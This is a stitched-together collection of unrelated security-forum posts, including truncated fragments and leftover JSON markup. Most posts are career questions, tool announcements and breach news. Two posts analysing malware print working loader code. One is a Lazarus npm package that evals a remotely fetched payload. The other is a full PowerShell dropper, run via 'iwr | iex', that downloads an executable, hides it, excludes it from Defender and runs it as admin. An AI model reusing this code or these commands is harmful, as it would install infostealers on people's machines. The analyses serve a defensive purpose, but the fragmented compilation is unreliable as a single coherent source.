    "text": "Case Study: Traditional CVSS scoring missed this actively exploited vulnerability (CVE-2024-50302). I came across an interesting case that I wanted to share with r/netsec - it shows how traditional vulnerability scoring systems can fall short when prioritizing vulnerabilities that are actively being exploited.\n\nThe vulnerability: CVE-2024-50302\n\nThis vulnerability was just added to CISA's KEV (Known Exploited Vulnerabilities) catalog today, but if you were looking at standard metrics, you probably wouldn't have prioritized it:\n\nBase CVSS: 5.5 (MEDIUM)\nCVSS-BT (with temporal): 5.5 (MEDIUM)\nEPSS Score: 0.04% (extremely low probability of exploitation)\n\nBut here's the kicker - despite these metrics, this vulnerability is actively being exploited in the wild.\n\nWhy standard vulnerability metrics let us down:\n\nI've been frustrated with vulnerability management for a while, and this example hits on three problems I consistently see:\n\n1. Static scoring: Base CVSS scores are frozen in time, regardless of what's happening in the real world\n2. Temporal limitations: Even CVSS-BT (Base+Temporal) often doesn't capture actual exploitation activity well\n3. Probability vs. actuality: EPSS is great for statistical likelihood, but can miss targeted exploits\n\nA weekend project: Threat-enhanced scoring\n\nAs a side project, I've been tinkering with an enhanced scoring algorithm that incorporates threat intel sources to provide a more practical risk score. I'm calling it CVSS-TE.\n\nFor this specific vulnerability, here's what it showed:\n\nBefore CISA KEV addition:\n- Base CVSS: 5.5 (MEDIUM)\n- CVSS-BT: 5.5 (MEDIUM)\n- CVSS-TE: 7.0 (HIGH) - Already elevated due to VulnCheck KEV data\n- Indicators: VulnCheck KEV\n\nAfter CISA KEV addition:\n- Base CVSS: 5.5 (MEDIUM)\n- CVSS-BT: 5.5 (MEDIUM)\n- CVSS-TE: 7.5 (HIGH) - Further increased\n- Indicators: CISA KEV + VulnCheck KEV\n\nTechnical implementation\n\nSince this is r/netsec, I figure some of you might be interested in how I approached this:\n\nThe algorithm:\n1. Uses standard CVSS-BT score as a baseline\n2. Applies a quality multiplier based on exploit reliability and effectiveness data\n3. Adds threat intelligence factors from various sources (CISA KEV, VulnCheck, EPSS, exploit count)\n4. Uses a weighted formula to prevent dilution of high-quality exploits\n\nThe basic formula is: CVSS-TE = min(10, CVSS-BT_Score * Quality_Multiplier + Threat_Intel_Factor - Time_Decay)\n\nThreat intel factors are weighted roughly like this:\n- CISA KEV presence: +1.0\n- VulnCheck KEV presence: +0.8\n- High EPSS (\u22650.5): +0.5\n- Multiple exploit sources present: +0.25 to +0.75 based on count\n\nThe interesting part\n\nWhat makes this vulnerability particularly interesting is the contrast between its EPSS score (0.04%, which is tiny) and the fact that it's being actively exploited. This is exactly the kind of case that probability-based models can miss.\n\nFor me, it's a validation that augmenting traditional scores with actual threat intel can catch things that might otherwise slip through the cracks.\n\nI made a thing\n\nI built a small lookup tool at github.io/cvss-te where you can search for CVEs and see how they score with this approach.\n\nThe code and methodology is on GitHub if anyone wants to take a look. It's just a weekend project, so there's plenty of room for improvement - would appreciate any feedback or suggestions from the community.\n\nAnyone else run into similar issues with standard vulnerability metrics? Or have alternative approaches you've found useful?\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b\u200b",

Idk which sub to post this but here: \n\nMoviepass is part of the cyber attack. \n\nSo, I had Moviepass when it was live, years ago. Throughout last yesr and this yesr I\u2019d get emails from them. Something bc about an updated version. I didn\u2019t think much of it. Asked me to sign up for a new version of it as like only the first X number of ppl can. I clicked the link I. The email.\n\nProblem is, my guards went up when they asked me to click on the email again. Keep in mind this whole time thr emails are coming from legit address. \n\nYou k ow how if if hold the button down it gives a preview of the web address? When I did rhis, thr website was all sorts of random characters like fkgh2454dghh. And it was super long. It wasn\u2019t for the previous time I clicked. \n\nThen the teitter attack happened. \n\nThen my email app (or my email provider?) logged me out the email. It kept telling me to sign back in. \n\nSo, yeah. Thru Moviepass they tried. If you go to Moviepass subreddit, there\u2019s stuff about MP trying to relaunch a new version recently etc. \n\nI think going forward thr best attacks will come from inside established companies or ones that have went under or trying to survive. \n\nThet tried hard. Like iver the course of last year they are hyping up a new version of Moviepass and like \u201climited sign up so hurry before the period ends!\u201d\n\nI didn\u2019t continue once I saw all those random characters, but Msybe it was too late. \n\nJust giving my experience. I\u2019ll post this in a couple more subs as I have t seen anyone talk about this.",

Key requirements:\n\n1. **Centralized Dashboard**\u00a0\u2013 Ability to see all endpoints and alerts in one place.\n2. **Scan Detection**\u00a0\u2013 When an employee runs a scan (Windows Defender or Macefee), the system should log it and alert if threats are found.\n3. **Budget-Friendly**\u00a0\u2013 Ideally suited for small to mid-sized businesses (not enterprise-grade pricing).\n4. **Real-Time Alerts**\u00a0\u2013 Notifications (email/dashboard) when malware is detected on any device.\n\nHas anyone used a cost-effective EDR that fits these needs?

Hope this is okay to post here. \n\nNeed help from someone who has investigated breaches. Currently my company (I'm SVP of engineering at a very large start up) has a massive breach and we cut the attackers off mid op. We have consulted a large cyber security firm to handle the containment but the attackers left some very odd things. Network devices with port forwarding and FW rules for what looks to be their hosting intermediary overseas.\n\n We have no idea where or who we can bring in to help us validate what we suspect maybe insider threat elements. This is well outside of our in house skill set and the firm we are working with is scoped to only do the contain and secure portions. They have given us a few names of potential venues but given the sensitive nature of the indications that surround the root cause of the leak involving the person who would have final budget approval over this is a concern. Someone willing to look over what we've found for us before we go to the authorities would make my team (and me) feel a lot better. \n\nNothing proprietary or classified, just need someone with strong cyber security (mostly port/network related) or forensic experience who's willing to do some quick review of the data we've gather to see if they agree with our conclusions would mean the world to us.\n\nWe are not opposed to paying T&M but would need to be reasonable enough to be considered discretionary (under 1000). Id estimate an hour, maybe 2 of time, but I'm not an expert so can agree to at most that. \n\nEven suggested services for this kind of work would be appreciated if no one is able here.",

I am currently using nmap to identify any open ports / running services, but I fail to get any further information on the services themselves, or OS details, or firmware information, etc. I have tried a whole bunch of flags, scripts, differnet time settings, etc. I have tried manually looking at banners, but the routers I am testing seem to have manually configured all services to give up no information. \n\n  \nTherein lies my issue; I really don't know how to proceed.

    "text": "Advice. Hi, as the title suggests I need a brutally honest answer on this. I got into a company named ManTech. Was given an entry level job as an administrative assistant for the Vp of the division. However after some experience for corporate security and getting my bachelors and a 6 level clearance, and a security plus. I can\u2019t seem to land a cyber job the company is great but they tend to undermined my EA administration duties and I was on the corporate security team but it was literal disaster and the manager was horrible. I was supposed to move to an almost guaranteed entry position but then the contract got screwed up and didn\u2019t have enough funding to open another role. However I feel stuck and burned being in the role for almost 2 years so really a year and a half. I\u2019m not sure what to do and my manager although a great guy and has helped me a ton wants to keep me around and I\u2019m don\u2019t know what to do. Please help me maybe the military is it a good fit but because of this very little experience and being burned I can\u2019t get a job in another company because they all require like 3 years of dedicated experience in some crazy role and then a master and now some of the entry level require a active poly. I also live in the DMV area where we are dominated with jobs from prior military. Thanks for your help",

The US has laws in place for government entities/contractors but there seems to be very little stopping most major companies from outsourcing labor (or hiring US-based MSSP that outsources labor).    \n  \n1. Do you support a mandate that only US citizens can be hired to safeguard these companies? If so, why? If not, why?\n\n2. Do you believe this would help the labor market in the US and create artificial demand for US cybersecurity professionals?   \n  \n3.

    "text": "Watching Lazarus debug malware on NPMjs. So something pretty interesting happened 2 weeks ago I can now share, where we got to watch the Lazarus grouop (North Korean APT) try and debug an exploit in real time.\n\nWe have been monitoring malware being uploaded into NPM and we got a notification that a new malicious package was uplaoded to NPM here [https://www.npmjs.com/package/react-html2pdf.js](https://www.npmjs.com/package/react-html2pdf.js) (now suspended finally!) . But when we investigated at first glance it didn't look too suspicious.\n\nFirst off the core file index.js didn't seem to be malicious and there was also nothing in the package.json file that led. Most malware will have a lifecycle hook like preinstall, install, postinstall. But we didn\u2019t see that in this package.\n\nAll that there was, was an innocent index.js file with the below.\n\n    function html2pdf() {\n    \n        return \"html2pdf\"\n    }\n    \n    module.exports = html2pd\n\nI can't include pics on the subreddit but essentially the group were hiding the malware with a very simple... but actually surprisingly successful obfuscation of just including a bunch of spaces  `' '`in the code to hide the actual malicious functions off screen. In NPM there is a scroll bar at the bottom of the code box which if you moved all the way to the right. You would see the full code below.\n\n**Here was what was hidden off screen**\n\n    function html2pdf() {\n        (async () => eval((await axios.get(\"https://ipcheck-production.up.railway[.]app/106\", {\n            headers: {\n                \"x-secret-key\": \"locationchecking\"\n            }\n        })).data))()\n        return \"html2pdf\"\n    }\n    \n    module.exports = html2pdf\n\nEssentially using eval to load and execute a payload from a malicious endpoint.\n\n**Please for god sake don't visit the link that delivers this malware. I'm trusting you all not to be silly here.** *I have included it because it might be interesting for some to investigate further.*\n\nThis is where things get pretty funny.\n\nWe noticed that actually this won't work for 2 reasons.  \n\\- 1: the dependency axios was not 'required' in the code above  \n\\- 2: The dependency axios was not included in the dependencies in the package.json file\n\n**But this turned out to be so much fun as 10 minutes later we noticed a new version being uploaded.**\n\n    const html2pdf = async () => {\n        const res = await axios.get(\"https://ipcheck-production.up.railway.app/106\", { headers: { \"x-secret-key\": \"locationchecking\" } });\n        console.log(\"checked ok\");\n        eval(res.data.cookie);\n        return \"html2pdf\"\n    }\n    \n    module.exports = html2pdf\n\nYou will notice two changes:\n\n1. Instead of a function, they are defining it as an async lambda.\u00a0\n2. They are eval()\u2019ing the res.data.cookie instead of [res.data](http://res.data) as in previous versions. But the payload is not in the cookie or a field called cookie when we fetch it from the server.\u00a0\n\nHowever, this still doesn\u2019t work due to the lack of an import/require statement.\u00a0\n\nThe console.log was a key give away they had no idea what was going on.\n\n**every 10 minutes after that we would get a new version of this as we realized we were watching them in real time try to debug there exploit!**\n\nI won't show every version in this reddit post but you can see them at this Blog [https://www.aikido.dev/blog/malware-hiding-in-plain-sight-spying-on-north-korean-hackers](https://www.aikido.dev/blog/malware-hiding-in-plain-sight-spying-on-north-korean-hackers)\n\nI also made a video here [https://www.youtube.com/watch?v=myP4ijez-mc](https://www.youtube.com/watch?v=myP4ijez-mc)\n\n**In the blog and the video we also explore the actual payload which is crazy nasty!!**\n\nBasically the payload would remain dormant until the headers   `{ \"x-secret-key\": \"locationchecking\" }` were included.\n\nThe payload would then do multiple things.\n\n* Steal any active Session tokens\n* Search for browser profiles and steal any caches and basically all data\n* identify any crypto wallets, particually browser extension absed wallets like MetaMask.\n* Steal MacOs keychains.\n* Download and infect machine with back door and more malware.\n\nAgain if you want to see the payload in all its glory you can find at the blog post.\n\n**How do we know its Lazarus**  \nA question any reasonable person will be asking is how did we know this is Lazarus.  \nWe have seen this almost exact payload before and we there are also multiple other indicators (below) we can use to reasonably apply responsibility.\n\n**IPs**\n\n* 144.172.96\\[.\\]80\n\n**URLs**\n\n* hxxp://144.172.96\\[.\\]80:1224/client/106/106\n* hxxp://144.172.96\\[.\\]80:1224/uploads\u00a0\n* hxxp://144.172.96\\[.\\]80:1224/pdown\n* https://ipcheck-production.up.railway\\[.\\]app/106\n\n**npm accounts**\n\n* pdec212\n\n**Github accounts**\n\n* pdec9690\n\n**So yea, here is a story about spying on Lazarus while they try to debug their exploit. Pretty fun.**",

Hey y'all, \n\nLong time member, first time poster. \n\nI want to get some advice from those of you who are more tenured in your careers, and those of you who are more experienced. \n\nI'm 26, and began my cyber career about 3 years ago, after working in IT for a while. I connected with a mentor who found me an entry level SOC role, which allowed me to pivot to different positions, and at the same time achieve multiple GIAC certs. I remember that time in my life, all work and study, no fun outside of work.\n\nIt nearly burned me out. \n\nShortly after getting my first AWS certificate in Nov last year, I stopped doing any kind of learning outside of work, and now am forcing myself back into it by scheduling my 3rd GIAC cert. \n\nMy question is, how do you find a balance between your job responsibilities, doing any extracurricular learning, and living life and enjoying yourself? I've found it very hard to balance it, I often go one end of the spectrum or another, and right now the idea of doing any learning scares me, because I'd rather play video games instead. \n\nI know this is a broad question, and we know the simple \"Take vacation\" answers. But I'm talking more long-term solutions. \n\nWhen I joined the industry, I know I signed up for a lifetime of learning, but I know we all have our limits, but need to stay informed and up-to-date on our knowledge so we can follow a conversation. I'm terrified of not being able to follow a conversation, or write code all by myself without AI tools.\n\nI'd appreciate anyone's thoughts or advice, maybe someone with this same question can take away something valuable. \n\n\u2764\ufe0f",

I have 4 years of experience as a swe and I want to explore another domain of IT. Tbh, I was a very mediocre developer and didn't enjoy the work. Reading code all day to fix bugs and add features just drained me mentally to the point where I never had energy after work. I was laid off about 9 months ago alongside half the department at the company and I've been struggling with figuring out what I want to do career wise.\n\nCyber security appeals to me and I'm currently studying for the Sec+ cert. I think I will pursue Analyst roles once I've completed the cert and learned some SIEM tools. I'm not looking to get back into a dev role as I don't want to code all day.\n\nCan someone please share some insight as to whether cyber sec would be a viable career choice? Will my dev background assist in securing SOC analyst roles and are there any other roles I could consider that don't require too much coding?\n\nTIA!",

    "text": "So what's the move for our devices on reentry. Surprised I could not find this topic. This is for pros please, but I am not one so medium level technical explanation would be great. Due to recent events my concerns about data security crossing b0rders has piqued. Looks like average folks need a new normal - what is the smart move now for travel? I travel for business and it's pretty inconvenient to wipe my devices every time I go on a trip. I just want basic privacy for my clients and sensitive personal info. Options include:  \n\\- Caution Level1: disable biometric lock and use password only on all devices and applications.  \n\\- Caution Level 4: E2E protect all applications and password lock all access before reentry but stay connected to all systems; leave storage on device.  \n\\- Caution level 5: Travel with normal devices but remove access to most cloud-backed-up data upon reentry, aka delete the local instances. (inconvenient; prone to data loss)  \n\\- Caution level 6: Set up secondary travel devices with highly limited data access: only enough for each client.  \n\\- Caution level9: Go full burner.\n\nSome of my questions relate to what info is still available when I delete info or wipe the devices. If I remove chat apps is that data still discoverable if they c0nfiscate my device. (PS I cannot believe I have to ask these questions now as a normal person living a boring l3gal life.)

Hi all,\n\nWanted to share a tool\u00a0I developed that I made for myself, and decided to open source it\u00a0as it might be helpful\u00a0to others. Jumping between browser tabs and different\u00a0tools during vuln research\u00a0was distracting for\u00a0my workflow, so I\u00a0consolidated it into a single\u00a0CLI tool.\n\nWhat\u00a0it does:\n\n* Terminal-based dashboard for exploring the\u00a0National Vulnerability Database\n* Search by vendor, product, date\u00a0range, and severity levels\n* View detailed vulnerability info\u00a0including CVSS scores and attack\u00a0vectors\n* Export findings to markdown templates for documentation\n* Save interesting vulns for later reference\n\nI\u00a0built it with Python with Rich for the UI. The setup is pretty straightforward with\u00a0just a few dependencies.\n\nYou\u00a0can check it out here: [https://github.com/zlac261/cve-dash](https://github.com/zlac261/cve-dash) \n\nIf anyone gives it a try, I'd love to hear what you think\u00a0- especially what features might make\u00a0it more useful for your workflow. This is something I actively\u00a0use in my day-to-day, so I'm continuing to improve it :)\n\n<3\n\n  \nedit: newline on link xd",

I own a company and recently, we were victim to a ransomware, demanded a pretty significative payment but luckily we were able to return to a safe backup.\n\nWe hired a cybersecurity consultancy firm and they found Sliver in an employee's computer, which enabled the hackers to scale privileges in our environment and have almost full control over what happened there. We found the email and it was a .zip with the virus disguised as a .pdf for a job application process.\n\nWe are in dealership business, it wasn't a big disruption but they did fuck up our financials. And this will sound very dumb, but we use ERPNext in AWS that I myself configured when the business began, and we never had a real tech guy besides myself (who knows tech as a hobby).

Recently I discovered an exploit that provided me access to the production backend for a unicorn startup. It was basically a exposed Admin API Key to their production database , which exposed user data and ability to modify/ delete them. This API key was publicly accessible on the internet and discoverable through dorking. The server access provided me access to user data, purchase history, some financial info ( but not card/ other data ), along with location information ( they collect that ) along with various other api keys and access to their other data stores etc . \n\nI raised a ticket in their Bug bounty program , however they did not reply for over a day so I reached out through other channel including known connections, and got a reply after 1 1/2 days. \n\nAnother day went by and they had successfully removed the place where the key was accessible and also revoking the key itself. \n\nThey later confirmed the same about this being a valid leak and offered me $200 in amazon vouchers. \n\nAs suggested by few of one of my friends that lurk Hackerone , I shared other bug bounty programs from similar sized companies including Uber, TPLink and their reward payouts for user data leak and admin access being anywhere from $2000~$4000 and asking to revise the payout ( since they do not have a defined structure ) . \n\nI additionally provided few things including: \n- the estimated CVSS score ( which I estimated it to be 9.2 using the CVSS 3.1 calculator ) \n- the data leak potential ( the place where the key was , had 50 unique views and supposedly was available there for over 5 months ). \n- My Expectations for a higher payout and due dilligence of ensuring the leaked data has not been misused and also rotating any and all security keys linked that were accessible ( they stored bunch of public keys in their database sicne they sell an IoT product ) . \n\nSince their product is IoT based, I also asked them to either provide an update about the current verifications of data safety and if required the proper disclosure protocols. \n\nIt has been 7 days since then, I have not heard back from them. They have not responded to my questions either. \n\nI am completely new to this and have no experience here. I may have asked more than I should have , and I may have asked \"too many questions\". \n\nHowever I feel , it makes sense that they ensure the data is not in wrong hands , and also if required publicly disclose it. Additionally , I feel I should be rewarded for the same and wouldn't mind $200 either since it wasn't a big effort or a complex thing either. \n\nHow should I proceed here? ",

Occurring on April 20, 2024, the breach remained unchecked for nearly six months, revealing a significant lapse in data security responsible for safeguarding personal identifiable information. The company discovered that cybercriminals exploited a zero-day vulnerability in their client management system, allowing them to maintain access to sensitive databases for an estimated 12 hours before being detected. Costly ramifications follow, with estimates suggesting that the actual number of impacted clients could potentially reach into the thousands given the breadth of California Cryobank's clientele across North America.\n\nThe implications of this breach are particularly troubling, as the information compromised includes not just names but also reproductive and genetic data that can have far-reaching effects on individuals' privacy. With breaches of this nature becoming more common in healthcare and reproductive technology sectors, experts warn that such organizations are increasingly attracting sophisticated threat actors. In response, California Cryobank has taken steps to enhance their security protocols, including new encryption measures and the introduction of multi-factor authentication, while offering affected clients access to credit monitoring and identity theft protection services. They are also actively cooperating with law enforcement and have set up a dedicated call center to provide support to concerned customers as they navigate this distressing situation.\n\nWhat steps do you think companies in the healthcare sector should take to improve their data security?\n\n**Learn More:**\u00a0[Cyber Security News](https://cybersecuritynews.com/us-sperm-donor-giant-california-cryobank-hackers/)\n\n",

    "text": "The Story of Stuxnet and a demo of the FlipperZero doing something \"kinda\" similar with BadUSB.. I've not been hacking for long. I guess I'm more of a coding mechanic than an engineer. After years and years of getting epically pissed off with the Stackoverflow community, constantly presuming prior knowledge or just being downright right rude, I felt myself pushed over to AI. \n\nNow I do most of my builds with it and very recently I had learnt about Stuxnet and the method of Sneakernet it used to get the virus into the offline nuclear facility in Iran. That coulpled with my fascination with the FlipperZero, I thought I'd make a video - one that tells the story and demos the BadUSB capabilities of the Flipper.\n\nYou don't need to watch it if you don't want to. I just know that a few months back I would have been following this sub and eagerly looking myself for content like this. Yes, it's self promo, but throw me a bone, it's basically impossible to get good content out there these days, so I hope you don't mind me posting this. And I understand the paradox I find myself in.\n\nIf you watch the video, enjoy it and maybe learn something - then I've done my job. Cheers \ud83d\udda4",

    "text": "Architectures for understanding security of a product similar to system design. Hey everyone, \n\nRecently, I have been learning about system design of multiple organisation and products such as Spotify, Netflix etc. and system design explains a lot about how such organisations have implemented their architecture, how they are using it, what's the need of such tech stacks in the first place etc. How their products works behind-the-scenes for example: when we stream movies on Netflix, then what exactly happens in the server side? Questions like this. Additionally, it also helps you to understand about the information that is required for topics like availability, scaling, security etc. But most of the time, it does not explain in-depth about the security architecture of their product, for example: How they are doing IaCs, how they are securing their pipelines, servers, Kubernetes and even if I talk about some pentesting stuff such as API Security, Web Application Security, Cloud Security and what are the challenges. So, my question is, are there any resources or platforms similar to bytebytego(mentioned this because I like the way they explain the architecture of a product), that talks more about the security architecture of a product/organisation that can help people to understand more about the product security in general? This may help security engineers more than security analyst, as I assume their daily job is to implement new techniques in appsec and security operations of a company for better security architecture for domain such as cloud, source code, web applications, mobile, infrastructure etc.   \n  \nLet me know if you guys have any resources for this.

Both apps utilize the Android API that flags mock locations\u2014Location.isFromMockProvider()\u2014to see if you are feeding them a fake location.\nIn practice, when Tinder/Bumble requests your location, they inspect the resulting Location object\u2019s isFromMockProvider() return. If true, the app knows the coordinates were injected by a mock provider app rather than the real GPS. This API was introduced in Android to help apps detect fake GPS usage, and by 2021 both Tinder and Bumble integrated it into their anti-spoofing logic.\nIf a mock is detected, Tinder/Bumble may react by silently ignoring the location update, showing an error, or even issuing an account ban for repeat offenders. Users have reported Tinder not updating their location or shadow-banning profiles when mock locations were on. Bumble similarly may block location changes if it senses a fake GPS.\n\nSo currently it's almost impossible to mock location for these two specific apps, although some VPNs + Mock Location apps work with amazon, snapchat, and Pok\u00e9mon.

Lazarus Group is suspected to be behind it, which isn\u2019t surprising given their history with crypto exploits.\n\nBybit says withdrawals are still working and they managed to recover **$50M**, covering user losses with their own reserves. It\u2019s good to see exchanges taking responsibility, but it also raises the question\u2014***how can CEXs improve security to stay ahead of these increasingly sophisticated attacks?***",

    "text": "TikToker @TheShellShield Is Spreading VIDAR Malware Through Fake Free Software Tutorials. I recently discovered that a TikToker, @TheShellShield, has been making multiple videos claiming to offer free software like Spotify Premium through a PowerShell command. However, this is actually a malware distribution campaign that installs the VIDAR infostealer onto victims\u2019 machines.\n\nHow the Scam Works:\n\t1.\tThe TikTok videos instruct users to run a PowerShell command:\n\niwr \u201c(ProgramName).keytool.cc\u201d | iex\n\n\t\u2022\tThe domain changes based on the software being \u201coffered.\u201d\n\n\t2.\tThis downloads a .ps1 (PowerShell script) onto the user\u2019s machine.\n\t3.\tThe script decodes a Base64-encoded URL, revealing:\n\nazsolver.com/files/main.exe\n\n\t\u2022\tThis main.exe file is VIDAR malware.\n\n\t4.\tThe script then:\n\t\u2022\tMoves main.exe to Local AppData\n\t\u2022\tHides the file and adds it as an exclusion in Windows Defender\n\t\u2022\tRuns the malware\n\t\u2022\tDisplays an error message:\n\nAn error occurred during activation. Please try again.\n\n\n\t5.\tVictims are unaware that their system is now infected with an infostealer or RAT (Remote Access Trojan).\n\nSigns of Infection:\n\t\u2022\tPeople in the comments are reporting activation errors, to which @TheShellShield responds with misleading troubleshooting questions (e.g., \u201cWhat version of Windows are you on?\u201d).\n\nEvidence & Actions Taken:\n\t\u2022\tAzsolver.com itself is not inherently malicious, but azsolver.com/files/main.exe is being used to distribute malware.\n\t\u2022\tVirusTotal has flagged this executable as malware (VIDAR Infostealer).\n\t\u2022\tI\u2019ve messaged the owner of azsolver.com to warn them about their site being used for malware distribution.\n\t\u2022\tI reported @TheShellShield to TikTok, but my takedown request was denied.\n",

    "text": "Fake Software activation Malware. I have very recently come across a TikTok (user: theshellshield ) account claiming to be able to activate certain software. I knew that this was nonsense. It was clear that it was relying on people  who did not know what they were doing typing stuff into the PowerShell and running it. The videos led the user to type `iwr \"windows.keytool.cc | iex` which downloaded and ran a script.\n\nTo see what was happening here I loaded up a Linux VM and used `iwr \"windows.keytool.cc\" -OutFile \"/home/user/output.txt\"` to have a look at the code.\n\nHere is what i got:\n\n    $downloadUrlB64 = \"aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=\"\n    $updaterExeB64 = \"dXBkYXRlci5leGU=\"\n    $hiddenAttrB64 = \"SGlkZGVu\"\n    $silentlyContinueB64 = \"U2lsZW50bHljb250aW51ZQ==\"\n    $stopActionB64 = \"U3RvcA==\"\n    $directoryB64 = \"RGlyZWN0b3J5\"\n    $runAsB64 = \"UnVuQXM=\"\n    \n    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))\n    $updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))\n    $hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))\n    $silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))\n    $stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))\n    $directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))\n    $runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))\n    \n    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())\n    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null\n    \n    $tempPath = Join-Path $hiddenFolder $updaterExe\n    \n    function Add-Exclusion {\n        param ([string]$Path)\n        try {\n            Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue\n        } catch {}\n    }\n    \n    try {\n        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction\n        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr\n        Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr\n        Add-Exclusion -Path $tempPath\n        Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait\n        Remove-Item $hiddenFolder -Recurse -Force\n    } catch {\n        exit 1\n    } finally {\n        Write-Host \"An error occurred during activation. Please try again.\"\n    }\n\nAfter decoding the base64 I got these values for the varibles\n\n|Variable|Variable|Decoded Value|\n|:-|:-|:-|\n|$downloadUrlB64|aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=|[https://azsolver.com/files/main.exe](https://removed)|\n|$updaterExeB64|dXBkYXRlci5leGU=|updater.exe|\n|$hiddenAttrB64|SGlkZGVu|Hidden|\n|$silentlyContinueB64|U2lsZW50bHljb250aW51ZQ==|SilentlyContinue|\n|$stopActionB64|U3RvcA==|Stop|\n|$directoryB64|RGlyZWN0b3J5|Directory|\n|$runAsB64|UnVuQXM=|RunAs|\n\n^(Note: I have removed the clickability of the link so you don't accidently download the file)\n\nI now know what this script does.\n\n1. Decodes the base64 to get the values above\n2. It generates a folder in the `LocalAppData` directory using a random GUID `$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString()) New-Item -ItemType $directory -Path $hiddenFolder | Out-Null`\n3. Downloads a suspicious File from [https://azsolver.com/files/main.exe](https://removed) and saves it as `updater.exe`  `Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction`\n4. Modifies the File and Folder attributes to mark them as hidden `Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr`\n5. Tries to get around Windows defender by attempting to exclude from the scanning (At least that's what I thinks its doing) `function Add-Exclusion { param ([string]$Path) try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {} } Add-Exclusion -Path $tempPath`\n6. Executes `updater.exe`  with Administrator  privileges while keeping window hidden `Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait`\n7. Deletes the evidence by removing the hidden folder `Remove-Item $hiddenFolder -Recurse -Force`\n8. If anything fails, display fake error message `Write-Host \"An error occurred during activation. Please try again.\"`\n\nTo conclude, I hope that this has brought some attention to it and that someone can help me get the account taken down. If anybody knows what happens with the exe after it runs please let me know as i am interested and not skilled enough to find out. Also feel free to suggest any ways i could of written this post better and or any errors i have made as this is the first time i have done this before.\n\nThank you for reading.\n\nUPDATE: The account got banned on TikTok\n\nAlso both keytool.cc and azsolver.com no longer host malware\n\n^(Edits: Corrected text spacing and updated the link)",

Opened Task Scheduler by pressing `Win + R`, typing `taskschd.msc`, and hitting Enter.\n2. Navigated to \"Task Scheduler Library\"\n3. Looked through the list and found a task named after my **user name**.\n4. Right-clicked the task, selected **Properties**, and under the **Actions** tab, I saw it was set to run \"cmd.exe /c start www\\[.\\]dongdonger\\[.\\]org\"\n5.

    "text": "How to develop an Effective Machine Learning Model for Malware Detection: A Step-by-Step Guide - Overview. When it comes to dealing with **zero-day attacks** and **advanced persistent threats**, Signature Analysis tends to fall short since it only detects known malware or variants of known malware. This is one of the main reasons machine learning models are integrated in antiviruses, in order to detect unknown processes the antivirus or sometimes the world has never seen before. \n\nMany AV solutions (Kaspersky, BitDefender, OmniDefender, Avast, Norton, McAfee etc) still combine both approaches (signature + ML) because signatures are extremely fast to scan known threats, while ML and heuristic methods help catch **unknown** threats.\n\n**NOTE: This post is already pretty long so we haven't explained everything, if you have questions let us know!**\n\n\n\n**Essentials Steps in Building a Malware Detection Model**:\n\nOur Environment and tools we used to develop our machine learning model for our antivirus OmniDefender:\n\n* **Ubuntu** \n* **Jupyter Notebook**\n* **Programming Language for Machine Learning: Python**\n* **Virtual Machine Windows 10 or Windows 7**\n\nThe goal will be to classify files as benign or malicious based on their features. In our case, we focus on Portable Executable files, which are commonly targeted by malware authors. Binary malware is also very hard to analyze because of their compiled nature.\n\n\n\n**1st step**: **Collecting Benign and Malware Samples**\n\nThe **1st step** will be collecting benign and malware files. There are many online malware repositories where you can download password protected archives containing collections of malware for free. Such repositories include:\n\n[http://freelist.virussign.com/freelist/](http://freelist.virussign.com/freelist/)\n\n[https://datalake.abuse.ch/malware-bazaar/daily/](https://datalake.abuse.ch/malware-bazaar/daily/)\n\n[https://virusshare.com/torrents](https://virusshare.com/torrents)\n\n[https://vx-underground.org/Samples](https://vx-underground.org/Samples)\n\nThere are a lot of other malware repositories, especially on GitHub but these 4 websites provide **hundreds of millions** of malware samples alone, which is way more than enough. VirusShare **alone** contains **90 million malware** samples of many file formats. I've downloaded them **all** and found out VirusShare has approximately **23 million** raw portable executable malware samples. \n\nNote: Make sure you collect these malware samples in a safe environment, we personally have been collecting samples on Ubuntu and use a **docker** on the malware folders on our **10TB and 20TB** Seagate Ironwolf Drives on read only (to prevent accidental on our part) and accessing them only on a Network Isolated Virtual Machine.\n\nUnfortunately when it comes to collecting Benign files you'll struggle a lot more, malware inherently have no rights so we are allowed to collect them as we please. But benign files tend to have copyrights, especially commercial software, so people that distribute benign software without authorization risk legal persecution.\n\nWe only collect benign software from:\n\n* Our own machines\n* Open-source repositories\n* Software where you have permission or it is publicly available (Internet Archive, older shareware/freeware sites)\n\nFortunately, as long as you don't distribute benign software online, you'll be fine. The first step we recommend taking to collect benign software would be to **copy** all portable executable software on a fresh or existing windows install, depending on the number of softwares you've downloaded, you could end up with over 100 000 Portable Executables, more or less. That would be a good start.\n\nAs you've noticed, compared to our malware database, there aren't a lot of places you can collect benign software. Until like me, you'll remember that **GitHub** is an enormous 